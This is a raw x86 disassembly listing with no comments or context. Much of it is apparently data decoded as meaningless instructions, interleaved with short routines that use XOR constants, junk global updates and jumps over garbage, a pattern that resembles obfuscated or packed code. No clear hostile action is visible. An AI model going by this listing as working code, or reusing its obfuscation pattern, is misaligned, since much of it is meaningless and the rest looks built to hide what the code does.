  4058f5:	mov    cl,0xd2
  4058f7:	push   esp
  4058f8:	scas   al,BYTE PTR es:[edi]
  4058f9:	pop    ebp
  4058fa:	and    al,0x56
  4058fc:	sbb    al,0x86
  4058fe:	mov    cs,esp
  405900:	sub    cl,BYTE PTR [ecx]
  405902:	stc    
  405903:	and    ebx,edi
  405905:	or     DWORD PTR [edi],esp
  405907:	ins    DWORD PTR es:[edi],dx
  405908:	push   0xc32b6c28
  40590d:	call   FWORD PTR [ebx-0x6b38e91b]
  405913:	add    esi,DWORD PTR [esi-0x71]
  405916:	int3   
  405917:	aaa    
  405918:	test   eax,0x74ca82c1
  40591d:	in     eax,0x9
  40591f:	xor    DWORD PTR [eax],edx
  405921:	repnz inc ecx
  405923:	and    esp,ebp
  405925:	fs jo  0x405968
  405928:	test   DWORD PTR [esi+eax*8],esi
  40592b:	add    DWORD PTR [edi],0xbde5b30a
  405931:	pop    eax
  405932:	imul   eax,ecx,0xffffffb9
  405935:	fbstp  TBYTE PTR [edi+0x26]
  405938:	leave  
  405939:	mov    ds:0xc26cf4a,eax
  40593e:	(bad)  
  40593f:	rcl    BYTE PTR [edx+0x700d00f9],cl
  405945:	aad    0xf2
  405947:	sub    edi,DWORD PTR [ebx-0x37]
  40594a:	mov    esi,0x1eefa45a
  40594f:	push   ds
  405950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405951:	add    BYTE PTR [ebx+0x3c],dl
  405954:	cmp    al,0x94
  405956:	out    0xb2,eax
  405958:	adc    eax,0xb3e0d9d9
  40595d:	loop   0x40592f
  40595f:	mov    edi,0x2c34a232
  405964:	add    bh,BYTE PTR [ebx+ebp*4-0x782d1306]
  40596b:	mov    edx,0x1053da05
  405970:	cmp    al,0x9e
  405972:	jno    0x4059b5
  405974:	sar    BYTE PTR [ebx-0x6f],1
  405977:	pop    ebp
  405978:	and    cl,bh
  40597a:	and    al,0xcb
  40597c:	ins    DWORD PTR es:[edi],dx
  40597d:	jbe    0x405913
  40597f:	pop    ss
  405980:	ror    bh,0x64
  405983:	push   es
  405984:	(bad)  
  405985:	mov    ds:0x35b5a8fb,al
  40598a:	ins    BYTE PTR es:[edi],dx
  40598b:	cwde   
  40598c:	jns    0x405a07
  40598e:	out    dx,al
  40598f:	scas   eax,DWORD PTR es:[edi]
  405990:	xchg   ebx,eax
  405991:	dec    ebx
  405992:	sub    BYTE PTR [edi+0x468f7149],ah
  405998:	fidiv  WORD PTR [eax]
  40599a:	dec    ebx
  40599b:	(bad)  
  40599c:	xor    al,0xc3
  40599e:	xor    ecx,DWORD PTR [ecx+0x22]
  4059a1:	inc    esi
  4059a2:	not    bh
  4059a4:	mov    ds:0xedec9935,al
  4059a9:	add    eax,ecx
  4059ab:	dec    edi
  4059ac:	lock enter 0x22e3,0xbc
  4059b1:	xchg   esp,eax
  4059b2:	cs out 0xe,al
  4059b5:	fs mov al,fs:0xb6831edb
  4059bc:	dec    ecx
  4059bd:	out    0x6f,al
  4059bf:	popf   
  4059c0:	jbe    0x405985
  4059c2:	mov    ah,0xe6
  4059c4:	inc    eax
  4059c5:	or     dh,ch
  4059c7:	into   
  4059c8:	mov    dl,0x2a
  4059ca:	cmp    dl,bh
  4059cc:	inc    esp
  4059cd:	sub    esi,DWORD PTR [edx]
  4059cf:	(bad)  [edi+0x7cb31147]
  4059d5:	dec    eax
  4059d6:	push   0x2f
  4059d8:	pop    edi
  4059d9:	loop   0x405962
  4059db:	in     al,0x20
  4059dd:	gs jns 0x4059de
  4059e0:	lea    ebp,[esi-0x697307c1]
  4059e6:	fs and edi,esp
  4059e9:	stos   DWORD PTR es:[edi],eax
  4059ea:	nop
  4059eb:	(bad)  
  4059ec:	rep ins BYTE PTR es:[edi],dx
  4059ee:	sub    al,BYTE PTR [ebx+0x42c093d2]
  4059f4:	sbb    al,0xb5
  4059f6:	inc    esp
  4059f7:	or     al,0x39
  4059f9:	adc    bl,cl
  4059fb:	mov    eax,ds:0xf8e2a6b2
  405a00:	ss daa 
  405a02:	call   0x4ebe:0x9990423e
  405a09:	call   0x26ea:0x28d6a483
  405a10:	sar    DWORD PTR [ebx+0x36b282cc],cl
  405a16:	push   cs
  405a17:	outs   dx,DWORD PTR ds:[esi]
  405a18:	push   eax
  405a19:	cmp    al,0x2b
  405a1b:	shl    BYTE PTR [eax],cl
  405a1d:	ins    DWORD PTR es:[edi],dx
  405a1e:	or     ecx,DWORD PTR [edi+0x18]
  405a21:	xchg   esp,eax
  405a22:	sub    edx,DWORD PTR [edi]
  405a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a25:	out    0xc1,al
  405a27:	jb     0x405a25
  405a29:	mov    ecx,0xe372799b
  405a2e:	(bad)  
  405a30:	xchg   edi,eax
  405a31:	pop    ds
  405a32:	xor    edi,esi
  405a34:	or     BYTE PTR [eax+0x58],0x68
  405a38:	jb     0x405a16
  405a3a:	icebp  
  405a3b:	call   0xba95:0x6200001a
  405a42:	jge    0x4059f6
  405a44:	inc    eax
  405a45:	mov    ebx,0xe5dbcc7c
  405a4a:	call   0xc752:0xa5dca21b
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fd71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fd71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fd71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fd71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fd71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e35b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fd59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fd59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fd59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e5b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fd59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fd59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fd51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e777,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x4278624d
  405b88:	cli    
  405b89:	jne    0x405b0f
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b64
  405b93:	fadd   QWORD PTR [esi]
  405b95:	inc    edi
  405b96:	(bad)  
  405b97:	push   0x3619dd35
  405b9c:	xchg   bl,al
  405b9e:	leave  
  405b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ba0:	mov    bl,0x15
  405ba2:	sbb    edx,DWORD PTR [ebp+0x25]
  405ba5:	test   eax,0x48cfb465
  405baa:	or     al,0xc7
  405bac:	stos   BYTE PTR es:[edi],al
  405bad:	imul   ebp,DWORD PTR [eax+0x6d57764c],0xffffffef
  405bb4:	test   al,0xbe
  405bb6:	repnz mov ebp,0xeadce41e
  405bbc:	inc    eax
  405bbd:	push   esp
  405bbe:	gs pushf 
  405bc0:	pop    ebx
  405bc1:	inc    eax
  405bc2:	dec    esp
  405bc3:	sbb    DWORD PTR [ecx+0x1d283cd9],ebp
  405bc9:	test   BYTE PTR [edx-0x8],dl
  405bcc:	xor    al,0x8b
  405bce:	test   eax,ebx
  405bd0:	mov    ebp,0xb7da2284
  405bd5:	xchg   ebx,eax
  405bd6:	sbb    eax,0xdbfc6720
  405bdb:	jecxz  0x405b77
  405bdd:	sub    al,0x5c
  405bdf:	aam    0x9e
  405be1:	aad    0x95
  405be3:	sub    DWORD PTR [ebx+0x19c322e5],ebp
  405be9:	push   ss
  405bea:	inc    edi
  405beb:	fld    TBYTE PTR [eax+0x70782785]
  405bf1:	in     al,dx
  405bf2:	mov    cl,0x7a
  405bf4:	pop    ebx
  405bf5:	(bad)  
  405bf6:	jecxz  0x405bf2
  405bf8:	xlat   BYTE PTR ds:[ebx]
  405bf9:	cmp    BYTE PTR [ebx+ebx*1],bh
  405bfc:	sar    DWORD PTR [ebp+0x75478d50],cl
  405c02:	xchg   DWORD PTR [ecx+eiz*4],eax
  405c05:	dec    esp
  405c06:	(bad)  
  405c08:	adc    esp,DWORD PTR [ebx+0x7b]
  405c0b:	jmp    0x405c64
  405c0d:	add    eax,DWORD PTR [esi]
  405c0f:	(bad)  
  405c10:	lock sbb ecx,DWORD PTR [edi]
  405c13:	jmp    0xd16838b3
  405c18:	sar    BYTE PTR [edx-0x43],1
  405c1b:	inc    ebp
  405c1c:	cld    
  405c1d:	popf   
  405c1e:	in     eax,0xf1
  405c20:	lods   eax,DWORD PTR ds:[esi]
  405c21:	cli    
  405c22:	cld    
  405c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c24:	mov    ah,0x77
  405c26:	or     eax,0x8421ee38
  405c2b:	jecxz  0x405bfd
  405c2d:	sub    al,0x62
  405c2f:	pop    eax
  405c30:	push   eax
  405c31:	cli    
  405c32:	dec    edx
  405c33:	cli    
  405c34:	add    esi,DWORD PTR [edi+0xf]
  405c37:	stc    
  405c38:	stos   DWORD PTR es:[edi],eax
  405c39:	cli    
  405c3a:	scas   eax,DWORD PTR es:[edi]
  405c3b:	inc    ecx
  405c3c:	mov    cs:0x358af58c,eax
  405c42:	jmp    0xac2e:0x9e5f
  405c48:	imul   edx,DWORD PTR [edx],0xffffff80
  405c4b:	xor    esp,DWORD PTR [eax-0x3c6b5684]
  405c51:	(bad)  
  405c53:	mov    dl,dh
  405c55:	xor    ecx,ecx
  405c57:	outs   dx,BYTE PTR ds:[esi]
  405c58:	repnz aas 
  405c5a:	adc    al,0x5d
  405c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5d:	or     ebx,DWORD PTR [edi-0x7e]
  405c60:	gs dec ecx
  405c62:	inc    ebp
  405c63:	xor    ch,ah
  405c65:	or     edi,ebx
  405c67:	sti    
  405c68:	and    ah,BYTE PTR [ebx+0x61]
  405c6b:	inc    ecx
  405c6c:	rcr    esi,0xa1
  405c6f:	and    al,0xad
  405c71:	adc    eax,0xff44fa28
  405c76:	arpl   cx,si
  405c78:	sub    eax,0xd84ce5c1
  405c7d:	sbb    BYTE PTR [ebx+0x31],dh
  405c80:	cld    
  405c81:	xor    al,cl
  405c83:	xor    DWORD PTR [esi-0x51c7157c],0x96b1d861
  405c8d:	push   esp
  405c8e:	hlt    
  405c8f:	pop    edx
  405c90:	push   ebx
  405c91:	ret    0x98b2
  405c94:	shr    BYTE PTR [eax+esi*2],1
  405c97:	fild   WORD PTR [ebp+0x4d8c29f1]
  405c9d:	sbb    DWORD PTR [esi-0x154f4114],eax
  405ca3:	adc    al,0x4d
  405ca5:	iret   
  405ca6:	xchg   edx,eax
  405ca7:	retf   
  405ca8:	or     DWORD PTR [eax-0xb],esi
  405cab:	sub    BYTE PTR [esi+ebx*2],0x27
  405caf:	leave  
  405cb0:	push   edi
  405cb1:	xor    eax,0x71eed83a
  405cb6:	or     BYTE PTR [esi+0x9],bl
  405cb9:	repnz or al,0xcd
  405cbc:	cdq    
  405cbd:	aas    
  405cbe:	or     al,0x76
  405cc0:	loopne 0x405cde
  405cc2:	ret    0x8a20
  405cc5:	jbe    0x405d1d
  405cc7:	clc    
  405cc8:	add    eax,0x90836fd1
  405ccd:	sbb    BYTE PTR [ebx-0x72d298b8],dh
  405cd3:	xchg   ebp,eax
  405cd4:	adc    DWORD PTR [esp+ebx*4],0xffffffe1
  405cd8:	daa    
  405cd9:	xchg   esi,eax
  405cda:	add    BYTE PTR [edi+ebx*4-0x77],0x65
  405cdf:	pop    esi
  405ce0:	or     ch,cl
  405ce2:	pop    es
  405ce3:	nop    DWORD PTR [ebx+edx*8]
  405ce7:	cwde   
  405ce8:	push   edi
  405ce9:	add    al,0xe9
  405ceb:	aam    0x57
  405ced:	loope  0x405d00
  405cef:	cdq    
  405cf0:	mov    edi,0x7d63ce42
  405cf5:	test   DWORD PTR [esi+edx*2],edi
  405cf8:	add    dl,ch
  405cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cfb:	cmc    
  405cfc:	push   cs
  405cfd:	pop    es
  405cfe:	jle    0x405cb8
  405d00:	adc    DWORD PTR [esi-0x40e0c8e2],ebx
  405d06:	fistp  WORD PTR [ecx+0x70728d7e]
  405d0c:	xchg   edi,eax
  405d0d:	or     eax,0xf0dc98ea
  405d12:	pushf  
  405d13:	retf   0x2c97
  405d16:	push   ebx
  405d17:	and    BYTE PTR [edx-0x1c03f3d1],al
  405d1d:	mov    ch,0x68
  405d1f:	jnp    0x405d57
  405d21:	aaa    
  405d22:	hlt    
  405d23:	xor    bl,cl
  405d25:	retf   
  405d26:	mov    WORD PTR ds:0xd33add15,ds
  405d2c:	xchg   ebx,eax
  405d2d:	pusha  
  405d2e:	push   ebp
  405d2f:	sti    
  405d30:	popf   
  405d31:	scas   eax,DWORD PTR es:[edi]
  405d32:	fcomp  st(4)
  405d34:	push   ecx
  405d35:	test   eax,0x7073b308
  405d3a:	repz adc al,0x59
  405d3e:	div    BYTE PTR [edi]
  405d40:	out    0xb5,eax
  405d42:	cmp    al,0x18
  405d44:	test   DWORD PTR [ebx+0x5def8be4],edx
  405d4a:	mov    edi,0xeadc8a65
  405d4f:	test   eax,0x9c2543bf
  405d54:	mov    ecx,0x2ffa39ae
  405d59:	iret   
  405d5a:	fnstenv [edi+0x1b15594e]
  405d60:	lahf   
  405d61:	test   eax,0x22f760e3
  405d66:	sbb    esi,DWORD PTR [ebp-0x8708dc9]
  405d6c:	inc    esi
  405d6d:	mov    al,0x17
  405d6f:	lods   al,BYTE PTR ds:[esi]
  405d70:	adc    ebx,DWORD PTR [ebx]
  405d72:	ficom  DWORD PTR [ecx-0x6f]
  405d75:	fistp  QWORD PTR [edx+0x2d2221e0]
  405d7b:	xchg   ebp,eax
  405d7c:	(bad)  
  405d7e:	retf   
  405d7f:	jmp    DWORD PTR [eax-0x30]
  405d82:	inc    esp
  405d83:	and    eax,0xe785aa0d
  405d88:	fcmove st,st(6)
  405d8a:	xor    eax,edx
  405d8c:	cmp    eax,0x23cb00e6
  405d91:	test   DWORD PTR [edi],ecx
  405d93:	mov    esp,0xfc041b8a
  405d98:	inc    ebx
  405d99:	cdq    
  405d9a:	xchg   edi,eax
  405d9b:	sbb    eax,0x4ac95bff
  405da0:	xor    al,BYTE PTR ds:0x2990f0ba
  405da6:	sub    eax,DWORD PTR [ebx-0x7f]
  405da9:	popa   
  405daa:	test   DWORD PTR fs:[ecx+0x13521ada],esp
  405db1:	mov    ds:0x3e8e7c0,al
  405db6:	jo     0x405d6c
  405db8:	inc    ebp
  405db9:	les    edx,FWORD PTR [ebx+0x56d4d0b9]
  405dbf:	fbld   TBYTE PTR [ebx]
  405dc1:	jne    0x405de8
  405dc3:	mov    DWORD PTR [esi],edi
  405dc5:	xor    esp,DWORD PTR [edx-0x5b6dcb43]
  405dcb:	mov    cl,0x40
  405dcd:	add    eax,0x6fa864f7
  405dd2:	mov    fs,WORD PTR [si+0x62]
  405dd6:	and    ah,BYTE PTR [ebx]
  405dd8:	pop    es
  405dd9:	cli    
  405dda:	popf   
  405ddb:	lock std 
  405ddd:	aaa    
  405dde:	sbb    al,0x7b
  405de0:	mov    es,esp
  405de2:	(bad)  
  405de3:	cmp    bl,BYTE PTR [edx+0x427e9a1c]
  405de9:	fidivr DWORD PTR [ebx+0x713a4809]
  405def:	mov    ds:0x5b5137da,al
  405df4:	cmp    eax,0xcf76186c
  405df9:	xor    ecx,DWORD PTR [ebp+0x63]
  405dfc:	stos   BYTE PTR es:[edi],al
  405dfd:	mov    cl,0x58
  405dff:	xor    DWORD PTR [eax-0x52dad82b],eax
  405e05:	mov    dl,0x29
  405e07:	mov    eax,ds:0xd8827b3a
  405e0c:	fs cmp ebp,ebx
  405e0f:	aam    0x4b
  405e11:	or     ecx,DWORD PTR [ecx-0x37]
  405e14:	xlat   BYTE PTR ds:[ebx]
  405e15:	sbb    ebx,DWORD PTR [edx+eiz*2-0x5b]
  405e19:	fstp   st(5)
  405e1b:	outs   dx,BYTE PTR ds:[esi]
  405e1c:	push   ecx
  405e1d:	cmc    
  405e1e:	stos   DWORD PTR es:[edi],eax
  405e1f:	jno    0x405e56
  405e21:	cld    
  405e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e23:	scas   eax,DWORD PTR es:[edi]
  405e24:	sahf   
  405e25:	into   
  405e26:	add    ecx,DWORD PTR [ecx-0x7fcf63]
  405e2c:	add    BYTE PTR [ecx+eax*1-0x4e633628],bl
  405e33:	adc    al,0x88
  405e35:	rol    DWORD PTR [ebp+0x77],cl
  405e38:	shl    al,1
  405e3a:	mov    dl,BYTE PTR [esi+0x7]
  405e3d:	mov    cl,0xef
  405e3f:	push   edi
  405e40:	ret    0x9950
  405e43:	loop   0x405e40
  405e45:	aam    0x13
  405e47:	jp     0x405e7c
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e78f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e76f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xfa
  405ea8:	sub    eax,0x3f3e753e
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f1a
  405eb4:	and    BYTE PTR [edx+ecx*4+0x158f7da4],cl
  405ebb:	not    DWORD PTR [eax+0x1c9ca241]
  405ec1:	test   edi,0x90a17d4f
  405ec7:	push   edi
  405ec8:	sub    ch,BYTE PTR [ebp+ecx*8-0x537a91c5]
  405ecf:	jg     0xe3785784
  405ed5:	push   0x10
  405ed7:	xchg   ecx,eax
  405ed8:	sbb    al,0x28
  405eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405edb:	jp     0x405ec9
  405edd:	repnz popa 
  405edf:	cmp    DWORD PTR [ecx+0x63e95d0b],ecx
  405ee5:	shl    BYTE PTR [eax],cl
  405ee7:	out    0xe3,eax
  405ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eea:	add    eax,0xc90b3c68
  405eef:	rol    DWORD PTR [esi+0x45],0x19
  405ef3:	jb     0x405f14
  405ef5:	inc    ecx
  405ef6:	popa   
  405ef7:	fstp   DWORD PTR [esi+0x2c080e74]
  405efd:	push   es
  405efe:	mov    al,bl
  405f00:	fucomp st(0)
  405f02:	inc    edi
  405f03:	push   ebp
  405f04:	in     al,0x8c
  405f06:	push   edi
  405f07:	jl     0x405ed4
  405f09:	and    ah,al
  405f0b:	in     eax,0xc5
  405f0d:	adc    edi,DWORD PTR [eax]
  405f0f:	xchg   esp,eax
  405f10:	test   DWORD PTR [ecx],ebp
  405f12:	mov    dh,ch
  405f14:	dec    ecx
  405f15:	sahf   
  405f16:	cmp    esp,DWORD PTR [edi-0x4e9cfe6a]
  405f1c:	dec    edi
  405f1d:	jl     0x405f87
  405f1f:	add    DWORD PTR [ecx-0x78cad834],0x73646e2d
  405f29:	push   ds
  405f2a:	ja     0x405fa4
  405f2c:	sar    DWORD PTR [ebp+0x6911a9f5],0x71
  405f33:	pop    eax
  405f34:	(bad)  
  405f35:	rcl    DWORD PTR [edi+0x6cb232e7],cl
  405f3b:	mov    cl,BYTE PTR [ebp-0x7eb1db3c]
  405f41:	sbb    DWORD PTR [edi+0x4e],edx
  405f44:	cwde   
  405f45:	loope  0x405f53
  405f47:	mov    al,ds:0xd3de5b0c
  405f4c:	inc    ebp
  405f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f4e:	cli    
  405f4f:	stos   BYTE PTR es:[edi],al
  405f50:	mov    ds:0xa8af0b70,al
  405f55:	adc    al,0x3e
  405f57:	inc    esi
  405f58:	enter  0x58f8,0x5a
  405f5c:	scas   eax,DWORD PTR es:[edi]
  405f5d:	cmp    DWORD PTR [eax+edi*4+0xc],ebp
  405f61:	xor    edi,edi
  405f63:	dec    edi
  405f64:	pusha  
  405f65:	pop    edx
  405f66:	jmp    0x7020adf8
  405f6b:	mov    bl,0xa
  405f6d:	and    DWORD PTR [edi-0x71cc356],edi
  405f73:	test   al,0x8f
  405f75:	cwde   
  405f76:	cli    
  405f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f78:	cld    
  405f79:	jecxz  0x405fc0
  405f7b:	inc    edi
  405f7c:	or     BYTE PTR [ebx-0x4667f04c],ah
  405f82:	mov    BYTE PTR [ebp-0x33],ah
  405f85:	lea    edi,[ecx+ebx*1-0x1cfbe244]
  405f8c:	jno    0x405fb7
  405f8e:	imul   ebp,DWORD PTR [edi-0x3b],0x29
  405f92:	js     0x405f90
  405f94:	retf   
  405f95:	pop    es
  405f96:	pop    ds
  405f97:	sti    
  405f98:	mov    edi,0x34c6512b
  405f9d:	into   
  405f9e:	sub    eax,0xbbfddf51
  405fa3:	cmp    al,0x18
  405fa5:	pop    esi
  405fa6:	mov    edx,0x82db7d49
  405fab:	scas   eax,DWORD PTR es:[edi]
  405fac:	fnstcw WORD PTR [edi+0x1]
  405faf:	sbb    BYTE PTR [eax],bl
  405fb1:	dec    esp
  405fb2:	pop    eax
  405fb3:	xchg   esi,eax
  405fb4:	jmp    0xac72d79c
  405fb9:	pop    ebp
  405fba:	cmp    BYTE PTR [esp+ecx*4],0x82
  405fbe:	cmp    ecx,DWORD PTR [ecx]
  405fc0:	pop    edi
  405fc1:	ror    DWORD PTR [edi+0x74],0x42
  405fc5:	stc    
  405fc6:	dec    ebx
  405fc7:	or     al,0xbb
  405fc9:	pop    ds
  405fca:	jge    0x405f81
  405fcc:	in     eax,0xea
  405fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fcf:	test   dh,bl
  405fd1:	xlat   BYTE PTR ds:[ebx]
  405fd2:	shr    ebx,cl
  405fd4:	lods   al,BYTE PTR ds:[esi]
  405fd5:	cmc    
  405fd6:	aaa    
  405fd7:	cli    
  405fd8:	jbe    0x40601a
  405fda:	out    0x21,al
  405fdc:	rcl    DWORD PTR [ebp-0x293bc00c],1
  405fe2:	inc    esi
  405fe3:	inc    ecx
  405fe4:	sahf   
  405fe5:	and    al,0x46
  405fe7:	or     esp,esp
  405fe9:	enter  0x246d,0xf9
  405fed:	scas   al,BYTE PTR es:[edi]
  405fee:	scas   al,BYTE PTR es:[edi]
  405fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ff0:	arpl   WORD PTR [edi+0x48],bp
  405ff3:	push   ecx
  405ff4:	loope  0x405f8d
  405ff6:	jnp    0x405fd8
  405ff8:	(bad)  
  405ff9:	(bad)  
  405ffa:	jmp    0x405fa6
  405ffc:	sub    BYTE PTR [ebx-0x1],bl
  405fff:	stos   DWORD PTR es:[edi],eax
  406000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406001:	dec    ebp
  406002:	pop    ebp
  406003:	cmovb  ebx,DWORD PTR [esi+0x61c793ee]
  40600a:	mov    cl,0xf4
  40600c:	sub    dl,cl
  40600e:	pop    ss
  40600f:	sbb    DWORD PTR [eax],ebx
  406011:	loope  0x406086
  406013:	dec    ebx
  406014:	cmp    BYTE PTR [edi],0x47
  406017:	int3   
  406018:	jle    0x40601b
  40601a:	and    al,0xee
  40601c:	xchg   ebx,eax
  40601d:	or     DWORD PTR [edx],ebp
  40601f:	mov    eax,ds:0x970d7a2e
  406024:	in     al,dx
  406025:	push   0xfb5b7827
  40602a:	sub    DWORD PTR [edi-0x63],ebp
  40602d:	jecxz  0x406005
  40602f:	dec    eax
  406030:	cli    
  406031:	in     al,dx
  406032:	push   esp
  406033:	mov    esi,0xe49585ea
  406038:	ss inc ebp
  40603a:	fisttp QWORD PTR [eax-0x1a]
  40603d:	ret    
  40603e:	xchg   ecx,eax
  40603f:	push   edi
  406040:	sub    al,0x43
  406042:	pushf  
  406043:	or     BYTE PTR [ebx],bl
  406045:	cld    
  406046:	cmp    esp,DWORD PTR [edx+0x223017d9]
  40604c:	cdq    
  40604d:	adc    eax,edx
  40604f:	mov    al,al
  406051:	xchg   ebp,eax
  406052:	add    eax,0x3e903899
  406057:	in     al,dx
  406058:	pop    ebx
  406059:	sub    ecx,ebp
  40605b:	add    BYTE PTR ds:0x32729c,al
  406061:	or     DWORD PTR ds:0x42fe06,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e198
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fdf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fd71,0x42e19c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fd51,0x42e77b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fd55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xcdfa4a96
  4060dc:	and    BYTE PTR [ebp+0x3e],0x70
  4060e0:	jo     0x406089
  4060e2:	jg     0x406154
  4060e4:	jo     0x40615b
  4060e6:	iret   
  4060e7:	outs   dx,DWORD PTR ds:[esi]
  4060e8:	mov    ah,0x18
  4060ea:	pop    ecx
  4060eb:	outs   dx,DWORD PTR ds:[esi]
  4060ec:	and    eax,0xe6a1b07a
  4060f1:	imul   ecx,ebx,0xb51e99f9
  4060f7:	push   esi
  4060f8:	push   esp
  4060f9:	push   ds
  4060fa:	mov    eax,0xa3f52aac
  4060ff:	lods   eax,DWORD PTR ds:[esi]
  406100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406101:	mov    edx,ecx
  406103:	mov    ebx,0xbb655a6d
